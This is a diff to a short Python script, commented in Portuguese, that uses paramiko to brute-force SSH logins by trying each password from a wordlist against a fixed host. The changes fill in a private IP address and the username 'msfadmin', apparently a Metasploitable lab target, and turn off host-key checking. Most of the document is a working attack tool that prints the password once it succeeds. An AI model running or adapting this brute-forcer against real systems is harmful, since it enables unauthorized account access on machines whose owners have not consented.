@@ -1,13 +1,14 @@
 import paramiko
 client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-hostname = "" #Insira o hostname/URL
+hostname = "192.168.16.77" #Insira o hostname/URL
 
-username = "" # Insira o username correto
+username = "msfadmin" # Insira o username correto
 
 #wordlistUser = "rockyou.txt" #Coloque a wordlist para ser utilizada nos usuários
 
-wordlistPass = "rockyou.txt" #Coloque a wordlist para ser utilizada nos usuários
+wordlistPass = "passwords.txt" #Coloque a wordlist para ser utilizada nos usuários
 
 #Username Bruteforce
 
@@ -32,7 +33,7 @@ with open(wordlistPass, 'rb') as arquivo:
         linha_str = linha_bytes.decode('utf-8')
         senha = linha_str.strip() 
         try: 
-            client.connect(hostname, username=username, password=senha)
+            client.connect(hostname=hostname, username=username, password=senha)
             print("Conexão estabelecida com sucesso!")
             print(f"A senha correta é: {senha}")
             break
